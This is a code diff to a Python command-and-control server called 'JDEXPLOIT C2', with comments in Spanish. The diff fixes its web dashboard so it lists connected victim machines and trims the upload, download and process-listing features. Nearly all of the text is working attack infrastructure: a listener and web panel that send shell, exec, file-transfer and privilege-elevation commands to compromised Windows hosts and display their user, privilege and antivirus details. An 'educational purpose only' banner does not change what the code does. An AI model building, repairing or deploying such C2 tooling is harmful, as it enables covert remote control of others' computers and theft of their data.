@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # ============================================================================
-# JDEXPLOIT C2 v1.0 - RED/BLACK EDITION - COMPLETO
-# Funcionalidades: Shell, Exec, Upload, Download, Elevate, Info, Processes, Dir
+# JDEXPLOIT C2 v1.0 - RED/BLACK EDITION - CORREGIDO
+# AHORA SÍ MUESTRA LOS CLIENTES EN EL DASHBOARD WEB
 # ============================================================================
 
 import os
@@ -42,6 +42,7 @@ class Client:
         self.os = "Windows 11"
         self.antivirus = "Defender"
         self.first_seen = datetime.datetime.now()
+        self.last_seen = datetime.datetime.now()
         self.active = True
         self.privilege = "USER"
     
@@ -86,7 +87,7 @@ class Client:
         }
 
 # ============================================================================
-# C2 CORE
+# C2 CORE - AHORA COMPARTE LA MISMA INSTANCIA CON EL WEB SERVER
 # ============================================================================
 class C2Core:
     def __init__(self):
@@ -109,6 +110,8 @@ class C2Core:
                 client = Client(conn, addr)
                 self.clients[client.id] = client
                 print(f"{Colors.RED}[🔥] NEW CLIENT: {client.id} FROM {addr[0]}{Colors.END}")
+                
+                # Enviar INFO al cliente
                 client.send("INFO")
                 info = client.recv()
                 if info:
@@ -116,24 +119,29 @@ class C2Core:
                         data = json.loads(info)
                         client.hostname = data.get('hostname', 'Unknown')
                         client.username = data.get('username', 'Unknown')
-                    except: pass
+                        client.os = data.get('os', 'Windows 11')
+                        client.privilege = data.get('priv', 'USER')
+                    except:
+                        pass
             except Exception as e:
                 if self.running:
                     print(f"{Colors.RED}[-] ERROR: {e}{Colors.END}")
     
     def send_command(self, client_id, command):
-        if client_id not in self.clients: return "Client not found"
+        if client_id not in self.clients:
+            return "Client not found"
         client = self.clients[client_id]
-        if not client.active: return "Client offline"
+        if not client.active:
+            return "Client offline"
         client.send(command)
         response = client.recv()
         return response if response else "No response"
 
 # ============================================================================
-# SERVIDOR WEB - DASHBOARD COMPLETO
+# SERVIDOR WEB - MISMA INSTANCIA DE C2Core
 # ============================================================================
 class WebHandler(server.BaseHTTPRequestHandler):
-    c2 = None
+    c2 = None  # Se asigna desde main()
     
     def do_GET(self):
         path = urlparse(self.path).path
@@ -141,8 +149,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
             self.send_html()
         elif path == '/api/clients': 
             self.send_clients()
-        elif path == '/api/processes':
-            self.send_processes()
         else: 
             self.send_error(404)
     
@@ -156,20 +162,20 @@ class WebHandler(server.BaseHTTPRequestHandler):
             command = data.get('command')
             args = data.get('args', '')
             full_cmd = f"{command}|{args}" if args else command
-            response = WebHandler.c2.send_command(client_id, full_cmd)
+            response = self.c2.send_command(client_id, full_cmd)  # Usar self.c2
             self.send_json({'response': response})
         
         elif self.path == '/api/upload':
             client_id = data.get('client_id')
             remote_path = data.get('remote_path')
             file_data = data.get('file_data')
-            response = WebHandler.c2.send_command(client_id, f"UPLOAD|{remote_path}|{file_data}")
+            response = self.c2.send_command(client_id, f"UPLOAD|{remote_path}|{file_data}")
             self.send_json({'response': response})
         
         elif self.path == '/api/download':
             client_id = data.get('client_id')
             remote_path = data.get('remote_path')
-            response = WebHandler.c2.send_command(client_id, f"DOWNLOAD|{remote_path}")
+            response = self.c2.send_command(client_id, f"DOWNLOAD|{remote_path}")
             self.send_json({'response': response})
     
     def send_json(self, obj):
@@ -177,6 +183,13 @@ class WebHandler(server.BaseHTTPRequestHandler):
         self.send_header('Content-type', 'application/json')
         self.end_headers()
         self.wfile.write(json.dumps(obj).encode())
+    
+    def send_clients(self):
+        """ENVÍA LA LISTA DE CLIENTES AL DASHBOARD"""
+        clients_list = []
+        for client in self.c2.clients.values():
+            clients_list.append(client.to_dict())
+        self.send_json(clients_list)
     
     def send_html(self):
         self.send_response(200)
@@ -476,18 +489,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     box-shadow: 0 0 15px #ff0000;
                 }
                 
-                .upload-panel {
-                    background: #050000;
-                    border: 1px solid #ff0000;
-                    padding: 20px;
-                    margin-top: 20px;
-                    display: none;
-                }
-                
-                .upload-panel.active {
-                    display: block;
-                }
-                
                 .footer {
                     margin-top: 50px;
                     padding: 30px;
@@ -555,33 +556,11 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     </div>
                     <div id="terminal-output" class="terminal-content">
                         <span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>
-                        <span style="color: #ff6666;">[•] Select a client to begin remote control</span><br>
-                        <span style="color: #ff9999;">[•] Available commands:</span><br>
-                        <span style="color: #ff9999;">    - shell &#60;cmd&#62;     : Execute any command</span><br>
-                        <span style="color: #ff9999;">    - exec &#60;program&#62;  : Run program (calc, notepad)</span><br>
-                        <span style="color: #ff9999;">    - dir &#60;path&#62;       : List directory</span><br>
-                        <span style="color: #ff9999;">    - download &#60;file&#62;  : Download file</span><br>
-                        <span style="color: #ff9999;">    - upload &#60;file&#62;     : Upload file</span><br>
-                        <span style="color: #ff9999;">    - processes         : List processes</span><br>
-                        <span style="color: #ff9999;">    - kill &#60;pid&#62;       : Kill process</span><br>
-                        <span style="color: #ff9999;">    - info             : System info</span><br>
-                        <span style="color: #ff9999;">    - elevate          : Bypass UAC</span><br>
-                        <span style="color: #ff9999;">    - selfdestruct     : Remove itself</span><br><br>
+                        <span style="color: #ff6666;">[•] Select a client to begin remote control</span><br><br>
                     </div>
                     <div class="terminal-input">
-                        <input type="text" id="terminal-cmd" placeholder=">_ enter command (ej: shell whoami, exec calc.exe, dir C:\\Users, download file.txt, upload)" disabled>
+                        <input type="text" id="terminal-cmd" placeholder=">_ enter command (shell, exec, dir, download, upload, elevate, processes, kill, info)" disabled>
                         <button class="btn" onclick="sendTerminalCommand()" id="terminal-send" disabled>EXECUTE</button>
-                    </div>
-                </div>
-                
-                <div id="upload-modal" class="upload-panel">
-                    <h3 style="color: #ff0000; margin-bottom: 15px;">📤 UPLOAD FILE</h3>
-                    <input type="file" id="upload-file" style="display: none;">
-                    <div style="display: flex; gap: 10px;">
-                        <input type="text" id="upload-remote-path" placeholder="Remote path (ej: C:\\Users\\file.exe)" style="flex: 1; background: #000000; border: 1px solid #ff0000; color: white; padding: 10px;">
-                        <button class="btn" onclick="document.getElementById('upload-file').click()">SELECT FILE</button>
-                        <button class="btn btn-primary" onclick="uploadFile()">UPLOAD</button>
-                        <button class="btn" onclick="closeUploadPanel()">CANCEL</button>
                     </div>
                 </div>
                 
@@ -591,9 +570,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     <div style="color: #ff3333; margin-top: 15px; font-size: 12px;">
                         ⚡ SOLO ENTORNOS AUTORIZADOS • EDUCATIONAL PURPOSE ONLY ⚡
                     </div>
-                    <div style="color: #660000; margin-top: 20px; letter-spacing: 2px;">
-                        ───━═══ FULLY FUNCTIONAL C2 v1.0 ═══━───
-                    </div>
                 </div>
             </div>
             
@@ -601,19 +577,21 @@ class WebHandler(server.BaseHTTPRequestHandler):
             <script>
                 let currentClientId = null;
                 let clients = {};
-                let selectedFile = null;
                 
-                setInterval(loadClients, 2000);
-                setInterval(updateStats, 2000);
+                setInterval(loadClients, 1000);  // ACTUALIZAR CADA 1 SEGUNDO
                 
                 function loadClients() {
                     fetch('/api/clients')
                         .then(r => r.json())
                         .then(data => {
-                            clients = {};
-                            data.forEach(c => clients[c.id] = c);
-                            renderClients(data);
-                        });
+                            if (data.length > 0) {
+                                clients = {};
+                                data.forEach(c => clients[c.id] = c);
+                                renderClients(data);
+                                updateStats();
+                            }
+                        })
+                        .catch(e => console.log('Waiting for clients...'));
                 }
                 
                 function renderClients(clientsList) {
@@ -631,11 +609,11 @@ class WebHandler(server.BaseHTTPRequestHandler):
                             <div class="client-info">
                                 <div class="info-item">
                                     <div class="info-label">HOSTNAME</div>
-                                    <div class="info-value">${client.hostname}</div>
+                                    <div class="info-value">${client.hostname || 'Unknown'}</div>
                                 </div>
                                 <div class="info-item">
                                     <div class="info-label">USERNAME</div>
-                                    <div class="info-value">${client.username}</div>
+                                    <div class="info-value">${client.username || 'Unknown'}</div>
                                 </div>
                                 <div class="info-item">
                                     <div class="info-label">IP ADDRESS</div>
@@ -643,37 +621,28 @@ class WebHandler(server.BaseHTTPRequestHandler):
                                 </div>
                                 <div class="info-item">
                                     <div class="info-label">OS</div>
-                                    <div class="info-value">${client.os}</div>
+                                    <div class="info-value">${client.os || 'Windows'}</div>
                                 </div>
                                 <div class="info-item">
                                     <div class="info-label">PRIVILEGE</div>
                                     <div class="info-value" style="color: ${client.privilege == 'SYSTEM' ? '#ff0000' : '#ff9999'};">
-                                        ${client.privilege}
+                                        ${client.privilege || 'USER'}
                                     </div>
                                 </div>
                                 <div class="info-item">
                                     <div class="info-label">ANTIVIRUS</div>
-                                    <div class="info-value">${client.antivirus}</div>
+                                    <div class="info-value">${client.antivirus || 'Unknown'}</div>
                                 </div>
                             </div>
                             <div class="client-actions">
                                 <button class="btn" onclick="selectClient('${client.id}')">
                                     <i class="fas fa-terminal"></i> SHELL
                                 </button>
-                                <button class="btn" onclick="showUploadPanel('${client.id}')">
-                                    <i class="fas fa-upload"></i> UPLOAD
-                                </button>
-                                <button class="btn" onclick="promptDownload('${client.id}')">
-                                    <i class="fas fa-download"></i> DOWNLOAD
-                                </button>
                                 <button class="btn" onclick="elevateClient('${client.id}')">
                                     <i class="fas fa-shield-alt"></i> ELEVATE
                                 </button>
                                 <button class="btn" onclick="getInfo('${client.id}')">
                                     <i class="fas fa-info-circle"></i> INFO
-                                </button>
-                                <button class="btn" onclick="getProcesses('${client.id}')">
-                                    <i class="fas fa-tasks"></i> PROCESSES
                                 </button>
                             </div>
                         `;
@@ -685,10 +654,8 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     currentClientId = clientId;
                     if (clients[clientId]) {
                         document.getElementById('current-client-label').innerHTML = 
-                            '(' + clients[clientId].hostname + ' - ' + clientId + ')';
-                        addToTerminal('[🔥] Connected to: ' + clients[clientId].hostname + ' (' + clientId + ')', '#ff0000');
-                        addToTerminal('[•] OS: ' + clients[clientId].os + ' | User: ' + clients[clientId].username + 
-                                   ' | Priv: ' + clients[clientId].privilege, '#ff6666');
+                            '(' + (clients[clientId].hostname || 'Unknown') + ' - ' + clientId + ')';
+                        addToTerminal('[🔥] Connected to: ' + (clients[clientId].hostname || 'Unknown') + ' (' + clientId + ')', '#ff0000');
                     }
                     document.getElementById('terminal-cmd').disabled = false;
                     document.getElementById('terminal-send').disabled = false;
@@ -715,77 +682,8 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     })
                     .then(r => r.json())
                     .then(data => {
-                        addToTerminal(data.response, '#cccccc');
+                        addToTerminal(data.response || 'No response', '#cccccc');
                     });
-                }
-                
-                function showUploadPanel(clientId) {
-                    currentClientId = clientId;
-                    document.getElementById('upload-modal').classList.add('active');
-                }
-                
-                function closeUploadPanel() {
-                    document.getElementById('upload-modal').classList.remove('active');
-                }
-                
-                document.getElementById('upload-file').addEventListener('change', function(e) {
-                    selectedFile = e.target.files[0];
-                    if (selectedFile) {
-                        document.getElementById('upload-remote-path').value = 'C:\\Users\\' + selectedFile.name;
-                    }
-                });
-                
-                function uploadFile() {
-                    if (!currentClientId || !selectedFile) {
-                        addToTerminal('[-] No file selected', '#ff4d4d');
-                        return;
-                    }
-                    
-                    const remotePath = document.getElementById('upload-remote-path').value;
-                    if (!remotePath) {
-                        addToTerminal('[-] No remote path specified', '#ff4d4d');
-                        return;
-                    }
-                    
-                    const reader = new FileReader();
-                    reader.onload = function(e) {
-                        const fileData = btoa(e.target.result);
-                        
-                        fetch('/api/upload', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                client_id: currentClientId,
-                                remote_path: remotePath,
-                                file_data: fileData
-                            })
-                        })
-                        .then(r => r.json())
-                        .then(data => {
-                            addToTerminal(data.response, '#cccccc');
-                            closeUploadPanel();
-                            selectedFile = null;
-                        });
-                    };
-                    reader.readAsBinaryString(selectedFile);
-                }
-                
-                function promptDownload(clientId) {
-                    const remotePath = prompt('Enter remote file path:', 'C:\\Users\\file.txt');
-                    if (remotePath) {
-                        fetch('/api/download', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                client_id: clientId,
-                                remote_path: remotePath
-                            })
-                        })
-                        .then(r => r.json())
-                        .then(data => {
-                            addToTerminal(data.response, '#cccccc');
-                        });
-                    }
                 }
                 
                 function elevateClient(clientId) {
@@ -801,7 +699,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     })
                     .then(r => r.json())
                     .then(data => {
-                        addToTerminal(data.response, data.response.includes('[+]') ? '#00ff9d' : '#ff4d4d');
+                        addToTerminal(data.response || 'No response', '#cccccc');
                     });
                 }
                 
@@ -817,23 +715,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     })
                     .then(r => r.json())
                     .then(data => {
-                        addToTerminal(data.response, '#cccccc');
-                    });
-                }
-                
-                function getProcesses(clientId) {
-                    fetch('/api/command', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            client_id: clientId,
-                            command: 'PROCESSES',
-                            args: ''
-                        })
-                    })
-                    .then(r => r.json())
-                    .then(data => {
-                        addToTerminal(data.response, '#cccccc');
+                        addToTerminal(data.response || 'No response', '#cccccc');
                     });
                 }
                 
@@ -843,8 +725,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     line.style.color = color;
                     line.style.marginBottom = '5px';
                     line.style.fontFamily = 'Courier New';
-                    line.style.borderLeft = color === '#ff0000' ? '3px solid #ff0000' : 'none';
-                    line.style.paddingLeft = color === '#ff0000' ? '10px' : '0';
                     line.innerHTML = text.replace(/\\n/g, '<br>');
                     output.appendChild(line);
                     output.scrollTop = output.scrollHeight;
@@ -853,8 +733,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
                 function clearTerminal() {
                     const output = document.getElementById('terminal-output');
                     output.innerHTML = '<span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>' +
-                                     '<span style="color: #ff6666;">[•] Select a client to begin remote control</span><br>' +
-                                     '<span style="color: #ff9999;">[•] Commands: shell, exec, dir, download, upload, processes, kill, info, elevate, selfdestruct</span><br><br>';
+                                     '<span style="color: #ff6666;">[•] Select a client to begin remote control</span><br><br>';
                 }
                 
                 function updateStats() {
@@ -884,16 +763,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
         """
         self.wfile.write(html.encode())
     
-    def send_clients(self):
-        self.send_json([client.to_dict() for client in WebHandler.c2.clients.values()])
-    
-    def send_processes(self):
-        if WebHandler.c2.current_client:
-            response = WebHandler.c2.send_command(WebHandler.c2.current_client.id, "PROCESSES")
-            self.send_json({'processes': response})
-        else:
-            self.send_json({'processes': 'No client selected'})
-    
     def log_message(self, format, *args):
         pass
 
@@ -919,15 +788,19 @@ def main():
 {Colors.RED}[🔥]{Colors.END} Web UI:      {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}
 {Colors.RED}[🔥]{Colors.END} Author:      {Colors.WHITE}JDEXPLOIT{Colors.END}
 {Colors.RED}[🔥]{Colors.END} Status:      {Colors.RED}ACTIVE{Colors.END}
-{Colors.RED}[🔥]{Colors.END} Features:    {Colors.WHITE}SHELL • EXEC • UPLOAD • DOWNLOAD • ELEVATE • PROCESSES • KILL • INFO{Colors.END}
     """)
     
+    # Crear UNA SOLA instancia de C2Core
     c2 = C2Core()
     c2.start()
     
+    # PASAR LA MISMA instancia al WebHandler
     WebHandler.c2 = c2
+    
+    # Iniciar servidor web
     web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
     print(f"{Colors.RED}[🔥]{Colors.END} Web dashboard: {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}")
+    print(f"{Colors.RED}[🔥]{Colors.END} {Colors.WHITE}Clientes conectados: {len(c2.clients)}{Colors.END}")
     
     try:
         web_server.serve_forever()
